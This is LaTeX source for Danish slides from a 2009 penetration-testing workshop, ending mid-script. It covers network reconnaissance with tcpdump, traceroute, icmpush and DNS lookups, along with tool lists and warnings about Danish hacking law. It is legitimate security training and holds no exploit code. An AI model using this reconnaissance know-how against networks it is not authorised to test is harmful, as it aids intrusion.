\documentclass[18pt,landscape,a4paper]{foils}

% HLK/ security6
\usepackage{sec6slides}

% nyheder:
% http://portswigger.net/proxy/download.html Burp proxy kan ændre
% requests
% husk 
% mindre tcpdump, mere "øvelse 1" "øvelse 2" osv.
% mine setups med John the ripper fra sylvester, evt kombineret med googlehacking?
% lidt cutenews?
% lidt mindre om dcom
% input fra Grey Hat Hacking bogen metasploit intro? kan måske 
% erstatte/udvide dcom som eksempel?

% ideer
% Nagioslike på Windows Hostmon
% Axence net tools
% intodns.com DNS report like
% icmpush på backtrack, install program
% inSSIDer metageek, istedet for netstumbler



% Basic things that we need are below
\selectlanguage{danish}

%\externaldocument{unix-audit-security-oevelser}
\externaldocument{\jobname-exercises}

\begin{document}

\mytitlepage
{Hackerworkshop}
{Oktober 2009}

%\vskip 1 cm
%\centerline{This is open source!}

\hlkprofil

% HLK/PROSA
\dagsplan

\slide{Kursusforløb}


\begin{list1}
\item Vi skal have glæde af hinanden i følgende kursusforløb   
\begin{list2}
\item 2 dage 
\end{list2}
\item I skal udover at lære en masse om protokoller og netværk 
\item Forhåbentlig lærer i nogle gode vaner!
\item Jeres arbejde med netværk kan lettes betydeligt - hvis I starter rigtigt!
\end{list1}


\slide{Formålet med kurset}
\vskip 2 cm

%{\hlkbig En 3 dages workshop, hvor du lærer at angribe dit netværk!}

\begin{list1}
\item Skabe en grundig forståelse for hackerværktøjer
  samt penetrationstest metoder
\item Sætte deltagerne istand til at kunne gennemføre enkle til
  videregående analyser af netværksopkoblede systemer 
\item Ruste deltagerne til at kunne identificere sårbarheder og usikre
  konfigurationer i netværk
\item Design af netværk til minimering af risici.
\end{list1}


\slide{Hacker - cracker}

{\bfseries Det korte svar - drop diskussionen}

%Det lidt længere svar:\\
Det havde oprindeligt en anden betydning, men medierne har taget
udtrykket til sig - og idag har det begge betydninger. 

{\color{red}\hlkbig Idag er en hacker stadig en der bryder ind i systemer!}

ref. Spafford, Cheswick, Garfinkel, Stoll, ...
- alle kendte navne indenfor sikkerhed

Hvis man vil vide mere kan man starte med:
\begin{list2}
\item \emph{Cuckoo's Egg: Tracking a Spy Through the Maze of Computer
 Espionage},  Clifford Stoll  
\item \emph{Hackers: Heroes of the Computer Revolution},
Steven Levy
\item \emph{Practical Unix and Internet Security},
Simson Garfinkel, Gene Spafford, Alan Schwartz 
\end{list2}


\slide{Hacking er magi}

\hlkimage{7cm}{wizard_in_blue_hat.png}

\vskip 1 cm

\centerline{Hacking ligner indimellem  magi}


\slide{Hacking er ikke magi}

\hlkimage{17cm}{ninjas.png}

\vskip 1 cm
\centerline{Hacking kræver blot lidt ninja-træning}


\slide{Hacking eksempel - det er ikke magi}

\begin{list1}
\item MAC filtrering på trådløse netværk
\item Alle netkort har en MAC adresse - BRÆNDT ind i kortet fra fabrikken
\item Mange trådløse Access Points kan filtrere MAC adresser
\item Kun kort som er på listen over godkendte adresser tillades adgang til netværket
\pause
\item Det virker dog ikke \smiley
\item De fleste netkort tillader at man overskriver denne adresse midlertidigt
\item Derudover har der ofte været fejl i implementeringen af MAC filtrering
\end{list1}

\slide{Myten om MAC filtrering}

\begin{list1}
\item Eksemplet med MAC filtrering er en af de mange myter 
\item Hvorfor sker det?
\item Marketing - producenterne sætter store mærkater på æskerne
\item Manglende indsigt - forbrugerne kender reelt ikke koncepterne
\item Hvad \emph{er} en MAC adresse egentlig
\item Relativt få har forudsætningerne for at gennemskue dårlig sikkerhed
\item Løsninger?
\pause
\item Udbrede viden om usikre metoder til at sikre data og computere
\item Udbrede viden om sikre metoder til at sikre data og computere
\end{list1}

\slide{MAC filtrering}

\hlkimage{15cm}{stupid-security.jpg}


\slide{Aftale om test af netværk}

{\bfseries Straffelovens paragraf 263 Stk. 2. Med bøde eller fængsel
  indtil 6 måneder 
straffes den, som uberettiget skaffer sig adgang til en andens
oplysninger eller programmer, der er bestemt til at bruges i et anlæg
til elektronisk databehandling.}

Hacking kan betyde:
\begin{list2}
\item At man skal betale erstatning til personer eller virksomheder
\item At man får konfiskeret sit udstyr af politiet
\item At man, hvis man er over 15 år og bliver dømt for hacking, kan
  få en bøde - eller fængselsstraf i alvorlige tilfælde 
\item At man, hvis man er over 15 år og bliver dømt for hacking, får
en plettet straffeattest. Det kan give problemer, hvis man skal finde
et job eller hvis man skal rejse til visse lande, fx USA og
Australien
\item Frit efter: \link{http://www.stophacking.dk} lavet af Det
  Kriminalpræventive Råd 
\item Frygten for terror har forstærket ovenstående - så lad være!
\end{list2}


\slide{Agenda: Planen for kurset}

\begin{list1}
%\item Indledning - præsentation
\item Sikkerhedsmæssige aspekter af TCP/IP:
\begin{list2}
\item Internet idag - aktuelle hændelser
\item Netværk OSI og Internetmodellerne
\item Hvad giver penetrationstest virksomheden
\end{list2}

\item Windows sikkerhed:
\begin{list2}
\item Distribuerede systemer og usikre protokoller 
\item Sårbarheder og CVE, udnyttelse af sårbarheder
\item hærdning af Windows systemer
\item sikkerhed i websystemer
\end{list2}

\item UNIX sikkerhed:
\begin{list2}
\item Udnyttelse af sikkerhedshuller
\item opbygning af infrastruktur til scanning
\item hærdning af UNIX systemer
\end{list2}
\end{list1}  

\slide{Agenda: Planen for kurset - fortsat}

\begin{list1}
%\item Indledning - præsentation

%\item Sikkerhedsmæssige aspekter af 802.11 trådløse netværk:
%\begin{list2}
%\item wardriving
%\item WEP og WPA cracking
%\item Opbygning af gode netværk med 802.11
%\end{list2}

\item Avancerede emner efter behov:
\begin{list2}
\item Metasploit framework
\item Opsamling af trafik og signaturer
\item Snort IDS
\item Mere hacking med Damn Vulnerable Linux
\item Mere webhacking med OWASP WebGoat
\end{list2}
\item Ovenstående forventes introduceret og giver jer rigeligt med arbejde efter kurset :-)
\end{list1}  

\slide{Kursusmateriale}
\label{reftest}

\hlkimage{4cm}{old_book_lumen_design_st_01.png}

\begin{list1}
\item Dette materiale består af flere dele:
\begin{list2}
%\item Introduktionsmateriale med baggrundsinformation
\item Kursusmaterialet - præsentationen til undervisning - dette sæt
\item Øvelseshæfte med øvelser
\end{list2}
\item Hertil kommer diverse ressourcer fra internet
\item Boot CD'er baseret på Linux
\item Bemærk: kursusmaterialet er ikke en substitut for andet materiale, der er udeladt mange detaljer som forklares undervejs, eller kan slås op på internet 
\end{list1}

\slide{Praktiske øvelser}

\begin{list1}
\item Der er en lang række praktiske øvelser som vil give jer erfaring med
\begin{list2}
\item ICMP - lavniveau netværksanalyse
\item portscanning - porte TCP og UDP
\item exploits - hvad er proof of concept kode
\item Videregående programmer og scripts
\item netcat - scripting af netværksopgaver
\item Brug af stand alone værktøjer - bootable cd-rom'er til analyse on-site
\item Brug af MD5 kryptografisk hash funktion til integritetscheck
\item PGP til sikker kommunikation
\item OpenVAS - automatiseret afvikling af penetrationstest
\item Wireshark (tidl. Ethereal) - open source netværkssniffer til Windows og UNIX
\item SSH programmer, hvordan virker de, Secure Copy SCP,
  Putty og WinSCP på Windows
\end{list2}
\end{list1}


% slides start
\slide{Forudsætninger}

\begin{list1}
\item Dette er en dybdegående workshop og fuldt udbytte kræver at
  deltagerne har mindst 2 års praktisk erfaring som teknikker og/eller
  systemadministrator
%\item Vi gennemgår mange forskellige ting - ofte i detaljer
\item Til penetrationstest og det meste Internet-sikkerhedsarbejde er der
 følgende forudsætninger
\begin{list2}
\item Netværkserfaring
\item TCP/IP principper - ofte i detaljer
\item Programmmeringserfaring er en fordel
\item UNIX kendskab er ofte en {\bfseries nødvendighed}\\
- fordi de nyeste værktøjer er skrevet til UNIX i form af Linux og BSD
\vskip 3 mm
\item Kurset anvender OpenBSD til øvelser og UNIX kendskab
  er derfor en fordel
\item Alle øvelser kan udføres fra en Windows PC - UNIX øvelserne
  foregår via login til UNIX maskinen
\end{list2}
\end{list1}

\slide{Kursusfaciliteter}

\begin{list1}
  \item der er lavet et netværk til test med følgende systemer:
    \begin{list2}
      \item UNIX server baseret på OpenBSD Fiona med HTTP server: diverse
      værktøjer, scripts, nmap 
\item et antal targets - Windows 2000, Linux m.fl.
    \end{list2}
\item På UNIX serveren tillades login diverse kursusbrugere - kursus1,
  kursus2, kursus3, ... kodeordet er {\bf kursus}
\item Der er DHCP server og IPv6 autoconfiguration - det er tilladt at
  tilslutte egen bærbar - på eget ansvar (hint: brug en firewall ;-)
\item \color{red} Det er IKKE tilladt at scanne udenfor det lokale
  netværk uden forudgående aftale 
- overtrædelse kan medføre bortvisning
\end{list1}

\slide{Kursusnetværk}

\hlkimage{22cm}{images/kursus-netvaerk.pdf}



\slide{BackTrack boot CD'er}

\hlkimage{15cm}{backtrack4-logo.png}

\begin{list1}
\item BackTrack \link{http://www.remote-exploit.org/backtrack.html}\\
BackTrack er baseret på Linux og må kopieres frit :-)
\item Brug CD'en eller VMware player til de grafiske værktøjer som Wireshark
\item Til begyndere indenfor Linux anbefales Ubuntu eller Kubuntu til
  arbejdsstationer 
\end{list1}

\slide{Damn Vulnerable Linux boot CD'er}

\hlkimage{15cm}{dvl-exploitme.png}

\begin{list1}
\item Damn Vulnerable Linux \link{http://www.damnvulnerablelinux.org/}\\
DVL er baseret på Linux og må kopieres frit :-)
\item Brug CD'en eller VMware player til den
\end{list1}

\slide{UNIX starthjælp}
\begin{list1}
\item Da UNIX indgår er her et lille \emph{cheat sheet} til UNIX
\begin{list2}
\item DOS/Windows kommando - tilsvarende UNIX, og forklaring
\item dir - ls - står for list files, viser filnavne
\item del - rm - står for remove, sletter filer
%\item ren - mv - move flytter filer til nyt navn, rename
%\item md - mkdir - make directory, lav en mappe/katalog
\item cd - cd - change directory, skifter katalog
\item type - cat - concatenate, viser indholdet af tekstfiler 
\item more - less - viser tekstfiler en side af gangen
\item attrib - chmod - change mode, ændrer rettighederne på filer 
\end{list2}
\item Prøv bare:
  \begin{list2}
    \item {\bfseries ls} list, eller long listing med {\bfseries ls -l} 
    \item {\bfseries cat /etc/hosts} viser hosts filen 
\item {\bfseries chmod +x head.sh} - sæt execute bit på en fil så den
  kan udføres som et program med kommandoen \verb+./head.sh+
  \end{list2}
\end{list1}

\slide{Hackerværktøjer}
% måske til reference afsnit?

\begin{list1}
\item Der benyttes på kurset en del værktøjer:
\begin{list2}
\item nmap - \link{http://www.insecure.org} portscanner
\item OpenVAS - \link{http://www.OpenVAS.org} automatiseret testværktøj
%\item libnet m.fl. - \link{http://www.packetfactory.net} - diverse projekter
%  relateret til pakker og IP netværk
%\item l0phtcrack - \link{http://www.atstake.com/research/lc/} - The Password
%  Auditing and Recovery Application
\item Wireshark - \link{http://http://www.wireshark.org/} avanceret netværkssniffer
%\item F.I.R.E -  \link{http://biatchux.dmzs.com/} - en cd-rom der indeholder en 
%  bootable Linux del.
\item OpenBSD - \link{http://www.openbsd.org} operativsystem med fokus
  på sikkerhed 
%\item \link{http://www.isecom.org/} - Open Source Security Testing
%  Methodology Manual - gennemgang af elementer der bør indgå i en struktureret test 
\item Putty - 
\link{http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html}
terminal emulator med indbygget SSH
\end{list2}
\item {\color{red} \bfseries 
NB: Der kan forekomme opsamling af hemmeligheder fra computere på
netværket! Hvis I benytter protokoller der sender kodeord i klar tekst
kan disse opsnappes med sniffere.
}
\end{list1}


\slide{Hvad skal der ske?}

\begin{list1}
\item Tænk som en hacker
\item Rekognoscering
\begin{list2}
\item ping sweep, port scan
\item OS detection - TCP/IP eller banner grab
\item Servicescan - rpcinfo, netbios, ...
\item telnet/netcat interaktion med services
\end{list2}
\item Udnyttelse/afprøvning: OpenVAS, nikto, exploit programs
\item Oprydning vises ikke på kurset, men I bør i praksis:
\begin{list2}
\item Lav en rapport
\item Gennemgå rapporten, registrer ændringer
\item Opdater programmer, konfigurationer, arkitektur, osv. 
\end{list2}
\item I skal jo også VISE andre at I gør noget ved sikkerheden.
\end{list1}


%\slide{Hackere}

% Her skal KSA præsentation ind

% session 1-2 netværk start her


% xxx \slide{RFC, Internet, åbne standarder}

% input fra tidligere præsentationer 5-10 slides

\slide{Internet idag}

\hlkimage{14cm}{images/server-client.pdf}

\begin{list1}
\item Klienter og servere
\item Rødder i akademiske miljøer
\item Protokoller der er op til 20 år gamle
\item Meget lidt kryptering, mest på http til brug ved e-handel 
\end{list1}

\slide{Internet er åbne standarder!}

{\hlkbig 
We reject kings, presidents, and voting.\\
We believe in rough consensus and running code.\\
-- The IETF credo Dave Clark, 1992.}

\begin{list1}
\item Request for comments - RFC - er en serie af dokumenter
\item RFC, BCP, FYI, informational\\
de første stammer tilbage fra 1969
\item Ændres ikke, men får status Obsoleted når der udkommer en nyere
  version af en standard
\item Standards track:\\
Proposed Standard $\rightarrow$ Draft Standard $\rightarrow$ Standard
\item  Åbne standarder = åbenhed, ikke garanti for sikkerhed
\end{list1}

\slide{The Internet Worm 2. nov 1988}

\begin{list1}
\item Udnyttede følgende sårbarheder
\begin{list2}
\item buffer overflow i fingerd - VAX kode
\item  Sendmail - DEBUG
\item Tillid mellem systemer: rsh, rexec, ...
\item dårlige passwords
\end{list2}
\item Avanceret + camouflage!
\begin{list2}
\item Programnavnet sat til 'sh'
\item Brugte fork() til at skifte PID jævnligt
\item password cracking med intern liste med 432 ord og /usr/dict/words
\item Fandt systemer i /etc/hosts.equiv, .rhosts, .forward, netstat ...
\end{list2}
\item Lavet af Robert T. Morris, Jr. 
\item Medførte dannelsen af CERT, \link{http://www.cert.org}
\end{list1}

\slide{CERT/CC - www.cert.org}

\hlkimage{10cm}{images/CERT-org.png}

\begin{list1}
\item Stiftet som reaktion på The Internet Worm i 1988  
\item betragtet som de seriøse - og konservative
\item informerer om sårbarheder og trusler
\item koordinerer aktiviteter - mellem leverandører
\item opsamler statistik for hacker aktivitet
\end{list1}

\slide{OSI og Internet modellerne}

\hlkimage{14cm,angle=90}{images/compare-osi-ip.pdf}


\slide{TCPDUMP - protokolanalyse pakkesniffer}

\hlkimage{14cm}{images/tcpdump-manual.pdf}


\centerline{\link{http://www.tcpdump.org}
- både til Windows og UNIX}
\slide{tcpdump - normal brug}

\begin{list2}
  \item tekstmode
\item kan gemme netværkspakker i filer
\item kan læse netværkspakker fra filer
\item er de-facto standarden for at gemme netværksdata i filer
\end{list2}

\begin{alltt}
\tiny [root@otto hlk]# tcpdump -i en0
tcpdump: listening on en0
13:29:39.947037 fe80::210:a7ff:fe0b:8a5c > ff02::1: icmp6: router advertisement
13:29:40.442920 10.0.0.200.49165 > dns1.cybercity.dk.domain:  1189+[|domain]
13:29:40.487150 dns1.cybercity.dk.domain > 10.0.0.200.49165:  1189 NXDomain*[|domain]
13:29:40.514494 10.0.0.200.49165 > dns1.cybercity.dk.domain:  24765+[|domain]
13:29:40.563788 dns1.cybercity.dk.domain > 10.0.0.200.49165:  24765 NXDomain*[|domain]
13:29:40.602892 10.0.0.200.49165 > dns1.cybercity.dk.domain:  36485+[|domain]
13:29:40.648288 dns1.cybercity.dk.domain > 10.0.0.200.49165:  36485 NXDomain*[|domain]
13:29:40.650596 10.0.0.200.49165 > dns1.cybercity.dk.domain:  4101+[|domain]
13:29:40.694868 dns1.cybercity.dk.domain > 10.0.0.200.49165:  4101 NXDomain*[|domain]
13:29:40.805160 10.0.0.200 > mail: icmp: echo request
13:29:40.805670 mail > 10.0.0.200: icmp: echo reply
...
\end{alltt}


\slide{Wireshark - grafisk pakkesniffer}

\hlkimage{20cm}{images/wireshark-website.png} 

\centerline{\link{http://www.wireshark.org}}
\centerline{både til Windows og UNIX, tidligere kendt som Ethereal}

\slide{Programhygiejne!}

\begin{list1}
  \item {\color{red}Download, installer - kør!} - farligt!
\item Sådan gøres det:
  \begin{list2}
    \item download program OG signaturfil/MD5
\item verificer signatur eller MD5
\item installer
\item brug programmet
\item hold programmet opdateret!\\
Se eksempelvis teksten på hjemmesiden:\\
\emph{Wireshark 0.99.2 has been released. Several security-related vulnerabilities have been fixed and several new features have been added.}
  \end{list2}
\item NB: ikke alle programmer har signaturer :(
\item MD5 er en envejs hash algoritme - mere om det senere
\end{list1}


\slide{Brug af Wireshark}

\hlkimage{13cm}{images/ethereal-capture-options.png}

\centerline{Man starter med Capture - Options}

\slide{Brug af Wireshark}

\hlkimage{24cm}{images/ethereal-main-window.png}

\centerline{Læg mærke til filtermulighederne}


\slide{Chaosreader}

\hlkimage{10cm}{chaosreader1.jpg}
\hlkimage{20cm}{chaosreader2.png}
\begin{list1}
\item Med adgang til et netværksdump kan man læse det med chaosreader
\item Output er HTML med oversigter over sessioner, billeder fra datastrømmen osv.
\item \link{http://chaosreader.sourceforge.net/}

\end{list1}


\slide{Secure Shell - SSH og SCP}

\begin{center}
\colorbox{white}{\includegraphics[width=12cm]{images/tshirt-9b.jpg}}  
\end{center}
\begin{list1}
\item SSH afløser en række protokoller som er usikre:
  \begin{list2}
  \item Telnet til terminal adgang
  \item r* programmerne, rsh, rcp, rlogin, ...
  \item FTP med brugerid/password
  \end{list2}
\end{list1}


\slide{SSH - de nye kommandoer er}
\begin{list1}
\item kommandoerne er:
\begin{list2}
  \item ssh - Secure Shell
  \item scp - Secure Copy
  \item sftp - secure FTP 
  \end{list2}
\item Husk: SSH er både navnet på protokollerne - version 1 og 2 samt
  programmet \verb+ssh+ til at logge ind på andre systemer
\item SSH tillader også port-forward, tunnel til usikre protokoller,
  eksempelvis X protokollen til UNIX grafiske vinduer
\item {\bfseries NB: Man bør idag bruge SSH protokol version 2!}
\end{list1}


\slide{Putty en SSH til Windows}

\begin{center}
\colorbox{white}{\includegraphics[width=13cm]{images/putty-1.jpg}}  

Login skærmen til Putty terminal programmet
\end{center}

\slide{Putty terminaladgang}

\begin{center}
\colorbox{white}{\includegraphics[width=20cm]{images/putty-screen2.jpg}}  

Billede fra \link{http://edu.muhos.fi/opas/ssh/putty-ohje.htm}
\end{center}

\slide{Grafisk Secure Copy - WinSCP}

\begin{center}
\colorbox{white}{\includegraphics[width=16cm]{images/winscp-login-advanced.png}}  
\end{center}

\begin{center}
\item screenshot fra \link{http://winscp.vse.cz/eng/screenshots/large/advanced.gif}
\end{center}

\slide{Grafisk Secure Copy - WinSCP}

\begin{center}
\colorbox{white}{\includegraphics[width=12cm]{images/winscp-explorer.png}}  
\end{center}

\begin{center}
\item screenshot fra
  \link{http://winscp.vse.cz/eng/screenshots/large/explorer.gif} 
\end{center}


\exercise{ex:putty-install}

\exercise{ex:winscp-install}



\exercise{ex:unix-login}

\exercise{ex:unix-cal}

\exercise{ex:sudo}

\exercise{ex:unix-boot-cd}

\exercise{ex:wireshark}

\exercise{ex:wireshark-sniff}

\slide{traceroute}

\begin{list1}
  \item traceroute programmet virker ved hjælp af TTL
\item levetiden for en pakke tælles ned i hver router på vejen og ved at sætte denne lavt
  opnår man at pakken \emph{timer ud} - besked fra hver router på vejen
\item default er UDP pakker, men på UNIX systemer er der ofte mulighed
  for at bruge ICMP
\end{list1}

\begin{alltt}
{\bfseries  traceroute 217.157.20.129}
traceroute to 217.157.20.129 (217.157.20.129)\\
, 30 hops max, 40 byte packets
 1  safri (10.0.0.11)  3.577 ms  0.565 ms  0.323 ms
 2  router (217.157.20.129)  1.481 ms  1.374 ms  1.261 ms
\end{alltt}


\slide{traceroute - med UDP}

\begin{alltt}
\small # {\bfseries tcpdump -i en0 host 217.157.20.129 or host 10.0.0.11}
tcpdump: listening on en0
23:23:30.426342 10.0.0.200.33849 > router.33435: udp 12 [ttl 1]
23:23:30.426742 safri > 10.0.0.200: icmp: time exceeded in-transit
23:23:30.436069 10.0.0.200.33849 > router.33436: udp 12 [ttl 1]
23:23:30.436357 safri > 10.0.0.200: icmp: time exceeded in-transit
23:23:30.437117 10.0.0.200.33849 > router.33437: udp 12 [ttl 1]
23:23:30.437383 safri > 10.0.0.200: icmp: time exceeded in-transit
23:23:30.437574 10.0.0.200.33849 > router.33438: udp 12
23:23:30.438946 router > 10.0.0.200: icmp: router udp port 33438 unreachable
23:23:30.451319 10.0.0.200.33849 > router.33439: udp 12
23:23:30.452569 router > 10.0.0.200: icmp: router udp port 33439 unreachable
23:23:30.452813 10.0.0.200.33849 > router.33440: udp 12
23:23:30.454023 router > 10.0.0.200: icmp: router udp port 33440 unreachable
23:23:31.379102 10.0.0.200.49214 > safri.domain:  6646+ PTR? \\
200.0.0.10.in-addr.arpa. (41)
23:23:31.380410 safri.domain > 10.0.0.200.49214:  6646 NXDomain* 0/1/0 (93)
14 packets received by filter
0 packets dropped by kernel
\end{alltt}

\slide{Værdien af traceroute}

\begin{list1}
\item diagnosticering af netværksproblemer - formålet med traceroute
\item indblik i netværkets opbygning!
\item svar fra hosts - en modtaget pakke fremfor et \emph{sort hul}

\item traceroute er ikke et angreb - det er også vigtigt at kunne
  genkende normal trafik!
\end{list1}

\slide{Network mapping}

\hlkimage{23cm}{images/network-example.pdf}

\begin{list1}
\item Ved brug af traceroute og tilsvarende programmer kan man ofte
  udlede topologien i det netværk man undersøger  
\end{list1}


\slide{Andre trace programmer}

\begin{list1}
  \item Der findes mange specialiserede trace programmer til diverse
  formål
\item Eksempel: dnstracer information om DNS servere
\end{list1}

\begin{alltt}
# dnstracer -r . www.security6.net
Strange amount of retries, setting to default
Tracing to www.security6.net via 10.0.0.11, timeout 15 seconds
10.0.0.11 (10.0.0.11) 
 |\___ H.GTLD-SERVERS.net [net] (192.54.112.30) 
 |     |\___ NS6.GANDI.net [security6.net] (80.67.173.196) * * * 
 |      \___ NS1.security6.net [security6.net] (217.157.20.130) 
 |           |\___ B.GTLD-SERVERS.net [net] (192.33.14.30) 
 |           |     |\___ NS6.GANDI.net [security6.net] ...
\end{alltt}

\slide{Flere traceprogrammer}

\begin{list1}

\item mtr My traceroute - grafisk \link{http://www.bitwizard.nl/mtr/}
\item lft - \emph{layer four trace} benytter TCP SYN og FIN prober
\item trace ved hjælp af TCP og andre protokoller findes
\item paratrace - \emph{Parasitic Traceroute via Established TCP Flows
    and IPID Hopcount} 
\item Der findes webservices hvor man kan trace fra, eksempelvis: \link{http://www.samspade.org}
\end{list1}

\slide{What time is it?}

\hlkimage{8cm}{images/xclock.pdf}

\begin{center}
\hlkbig Hvad er klokken?

\vskip 1 cm
Hvad betydning har det for sikkerheden?

Brug NTP Network Time Protocol på produktionssystemer
\end{center}

\slide{What time is it? - spørg ICMP}

\vskip 1 cm

\begin{list1}
  \item ICMP timestamp option - request/reply
\item hvad er klokken på en server
\item Slayer icmpush - er installeret på server
\item viser tidstempel
\end{list1}

\begin{alltt}
# {\bfseries icmpush -v -tstamp 10.0.0.12}
ICMP Timestamp Request packet sent to 10.0.0.12 (10.0.0.12)

Receiving ICMP replies ...
fischer         -> 21:27:17
icmpush: Program finished OK
\end{alltt}

\slide{Netmasken? - spørg ICMP}

\vskip 1 cm

\begin{list1}
  \item ICMP address mask option - request/reply
\item hvilken netmaske bruger serveren
\item Slayer icmpush - er installeret på server
\item viser netmasken
\end{list1}

\begin{alltt}
# {\bfseries icmpush -v -mask 217.157.20.129}
ICMP Address Mask Request packet sent to 217.157.20.129

Receiving ICMP replies ...
router.kramse.dk -> 255.255.255.240
icmpush: Program finished OK
\end{alltt}

\exercise{ex:ping}
\exercise{ex:icmpush}


% session 1-4

\slide{Informationsindsamling}

\begin{list1}
\item Det vi har udført er informationsindsamling
\item Indsamlingen kan være aktiv eller passiv indsamling i forhold
  til målet for angrebet
\item passiv kunne være at lytte med på trafik eller søge i databaser
  på Internet
\item aktiv indsamling er eksempelvis at sende ICMP pakker og
  registrere hvad man får af svar
\end{list1}

\slide{MAC adresser}
%\hlkimage{10cm}{apple-oui.png}

\begin{alltt}
00-03-93   (hex)        Apple Computer, Inc.
000393     (base 16)    Apple Computer, Inc.
                        20650 Valley Green Dr.
                        Cupertino CA 95014
                        UNITED STATES
\end{alltt}
\begin{list1}
\item Netværksteknologierne benytter adresser på lag 2
\item Typisk svarende til 48-bit MAC adresser som kendes fra Ethernet MAC-48/EUI-48
\item Første halvdel af adresserne er Organizationally Unique Identifier (OUI)
\item Ved hjælp af OUI kan man udlede hvilken producent der har produceret netkortet
\item \link{http://standards.ieee.org/regauth/oui/index.shtml}
\end{list1}

\slide{IPv4 pakken - header - RFC-791}

\begin{alltt}
\small  
    0                   1                   2                   3   
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Source Address                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Destination Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

                    Example Internet Datagram Header
\end{alltt}


\slide{Well-known port numbers}

\hlkimage{10cm}{iana1.jpg}

\begin{list1}
\item IANA vedligeholder en liste over magiske konstanter i IP
\item De har lister med hvilke protokoller har hvilke protokol ID m.v.
\item En liste af interesse er port numre, hvor et par eksempler er:
\begin{list2}
\item Port 25 SMTP Simple Mail Transfer Protocol
\item Port 53 DNS Domain Name System
\item Port 80 HTTP Hyper Text Transfer Protocol over TLS/SSL
\item Port 443 HTTP over TLS/SSL
\end{list2}
\item Se flere på \link{http://www.iana.org}
\end{list1}

\slide{Internet idag}
\hlkimage{10cm}{map_of_the_internet.jpg}

\slide{whois systemet}

\begin{list1}
\item IP adresserne administreres i dagligdagen af et antal Internet
  registries, hvor de største er:
\begin{list2}
\item RIPE (Réseaux IP Européens)  \link{http://ripe.net}
\item ARIN American Registry for Internet Numbers \link{http://www.arin.net}
\item Asia Pacific Network Information Center \link{http://www.apnic.net}
\item LACNIC (Regional Latin-American and Caribbean IP Address
  Registry) - Latin America and some Caribbean Islands
  \link{http://www.lacnic.net} 
\item AfriNIC African Internet Numbers Registry \link{http://www.afrinic.net}
\end{list2}
\item disse fem kaldes for Regional Internet Registries (RIRs) i
  modsætning til Local Internet Registries (LIRs) og National Internet
  Registry (NIR) 
\end{list1}

\slide{Domain Name System}

\hlkimage{12cm}{dns-1.pdf}

\begin{list1}
\item Gennem DHCP får man typisk også information om DNS servere
\item En DNS server kan slå navne, domæner og adresser op
\item Foregår via query og response med datatyper kaldet resource records
\item DNS er en distribueret database, så opslag kan resultere i flere opslag
\end{list1}


\slide{DNS systemet}
 
\begin{list1}
\item navneopslag på Internet  
\item tidligere brugte man en {\bfseries hosts} fil\\
  hosts filer bruges stadig lokalt til serveren - IP-adresser
\item UNIX: /etc/hosts
\item Windows \verb+c:\windows\system32\drivers\etc\hosts+
\item Eksempel: www.security6.net har adressen 217.157.20.131
\item skrives i database filer, zone filer
\end{list1}
\begin{alltt}
  ns1     IN      A       217.157.20.130
  IN      AAAA    2001:618:433::1
  www     IN      A       217.157.20.131
  IN      AAAA    2001:618:433::14
\end{alltt}

\slide{Mere end navneopslag}

\begin{list1}
\item består af resource records med en type:
  \begin{list2}
  \item adresser A-records, fra navn til IP
\item PTR reverse records, fra IP til navn
  \item IPv6 adresser AAAA-records
  \item autoritative navneservere NS-records
  \item post, mail-exchanger MX-records
  \item flere andre: md ,  mf ,  cname ,  soa ,
    mb , mg ,  mr ,  null ,  wks ,  ptr ,
    hinfo ,  minfo ,  mx ....
  \end{list2}
\end{list1}
\begin{alltt}
  IN      MX      10      mail.security6.net.
  IN      MX      20      mail2.security6.net.
\end{alltt}

\slide{DNS root servere}
\begin{list1}
\item Root-servere - 13 stk geografisk distribueret fordelt på Internet
\end{list1}

\begin{alltt}
  I.ROOT-SERVERS.NET.     3600000 A       192.36.148.17
  E.ROOT-SERVERS.NET.     3600000 A       192.203.230.10
  D.ROOT-SERVERS.NET.     3600000 A       128.8.10.90
  A.ROOT-SERVERS.NET.     3600000 A       198.41.0.4
  H.ROOT-SERVERS.NET.     3600000 A       128.63.2.53
  C.ROOT-SERVERS.NET.     3600000 A       192.33.4.12
  G.ROOT-SERVERS.NET.     3600000 A       192.112.36.4
  F.ROOT-SERVERS.NET.     3600000 A       192.5.5.241
  B.ROOT-SERVERS.NET.     3600000 A       128.9.0.107
  J.ROOT-SERVERS.NET.     3600000 A       198.41.0.10
  K.ROOT-SERVERS.NET.     3600000 A       193.0.14.129
  L.ROOT-SERVERS.NET.     3600000 A       198.32.64.12
  M.ROOT-SERVERS.NET.     3600000 A       202.12.27.33  
\end{alltt}

\slide{DK-hostmaster}

\begin{list1}
\item bestyrer .dk TLD - top level domain
  
\item man registrerer ikke .dk-domæner hos DK-hostmaster, men hos en
  registrator 
\item Et domæne bør have flere navneservere og flere postservere
\item autoritativ navneserver - ved autoritativt om IP-adresse for
  maskine.domæne.dk findes 
\item ikke-autoritativ - har på vegne af en klient slået en adresse op
\item Det anbefales at overveje en service som
  \link{http://www.gratisdns.dk} der har 5 navneservere distribueret
  over stor geografisk afstand - en udenfor Danmark
\end{list1}

\slide{Små DNS tools bind-version - Shell script}

\begin{alltt}\small
#! /bin/sh
# Try to get version info from BIND server
PROGRAM=`basename $0`
. `dirname $0`/functions.sh
